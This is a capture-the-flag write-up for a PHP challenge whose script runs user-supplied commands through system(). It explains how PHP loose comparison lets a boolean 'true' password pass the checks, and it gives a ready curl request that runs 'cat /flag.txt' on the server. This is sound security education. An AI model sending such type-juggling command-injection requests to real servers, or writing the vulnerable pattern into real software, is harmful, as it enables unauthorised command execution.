# Never gonna tell a lie and type you
> todo

## First look
### Dockerfile
We see that the flag is stored into a text file at `/flag.txt`.
Then a php server is started on port 8080 via `php -S 0.0.0.0:8080` which serves the `index.php` file.

### index.php
A simple php script which expects a POST request with a fixed UserAgent. Otherwise it will return `we don't tolerate toxicity`.  
If we pass the correct username and password for the admin account we can execute any command we want on the server.

## Solution
By looking around we found that we have to bypass all the checks 
```php
$user_input = json_decode($_POST["data"]);
if ($_SERVER['HTTP_USER_AGENT'] != "friendlyHuman") {
    die("we don't tolerate toxicity");
}
if ($user_input->{'user'} === "admin🤠") {
    if ($user_input->{'password'} == securePassword($user_input->{'password'})) {
        echo " hail admin what can I get you " . system($user_input->{"command"});
    } else {
        die("Skill issue? Maybe you just try  again?");
    }
}
```
Passing the UserAgent and the user is easy by just setting the header and json data in the request.
The password is a bit more tricky. The password is checked against the `securePassword` function. The function is defined as follows:
```php
function securePassword($user_secret)
{
    if ($user_secret < 10000) {
        die("nope don't cheat");
    }
    $o = (int) (substr(hexdec(md5(strval($user_secret))), 0, 7) * 123981337);
    return $user_secret * $o;
}
```

The first check in `securePassword` compares the input to the integer `10000`. Thus passing a random ascii string to the function doesn't work due to `Uncaught TypeError: Unsupported operand types: string * int`.  
Realizing this we *thought* that we can limit our range of values to integers.

### Brute force
To get a better understanding about the `securePassword` function we reimplemented it in python and tried to bruteforce the password.
```py
from hashlib import md5

def pwd(s):
    return s * int(
        float(f"{int(md5(str(s).encode()).hexdigest(), 16):e}"[0:7]) * 123981337
    )

secret = 0
while True:
    p = pwd(secret)
    if secret == p:
        print("[SOLUTION]", secret)
    secret += 1
```
Which after _some_ (a lot of) time only yields `0` as the solution. 

### Passing 0 to securePassword
The only problem: the value passed to `securePassword` is checked to be greater than `10000` otherwise it fails. So we need to find a way to bypass this.

#### Passing 0 as integer
Ok so lets try passing `0` to the function anyways and see what happens: The function errors out with `nope don't cheat` as expected.

#### Passing 0 as string
So maybe we can bypass the check by passing `0` as a string. So we try to pass `"0"` to the function and see what happens: The integer `10000` is automatically casted to an string and the function errors out with `nope don't cheat`. So we need to find another a way to bypass this check.

### Passing Boolean values
After some more testing and thinking about it, we tried to pass other data types in hopes of bypassing the password checks.

Knowing that PHP always tries to cast the second value of the comparison when not using strict type comparison we can try to pass a boolean value to the function. But which one?  
Like many other languages PHP converts every NON-(NULL/ZERO/FALSE) value to `true`. Therefore if we pass `true` what actually gets evaluated is `true < 10000` which is cast to `true < true` and yields `false` thus `securePassword` returns some non-zero value.  
The same applies to the inner if statement: `$user_input->{'password'} == securePassword($user_input->{'password'})`. If we pass `true` as password the comparison is `true == securePassword(true)` which is cast to `true == true` and yields `true` thus the if statement is true and the command is executed.

### Getting the flag
Now that we know how to bypass the checks we can send a request to the server with the following payload:
```json
{
    "user": "admin🤠",
    "password": true,
    "command": "cat /flag.txt"
}
```
We had some issues posting the data with a pure JSON body until we realized that the server expects the data to be urlencoded.
```sh
curl 'http://<URL>.ctf.kitctf.de/' \
-A 'friendlyHuman' \
-H 'Content-Type: application/x-www-form-urlencoded' \
--data-urlencode 'data={"user": "admin🤠", "password": true, "command": "cat /flag.txt"}'
```

The command is executed and we receive the flag in the response: `GPNCTF{fake_flag}`
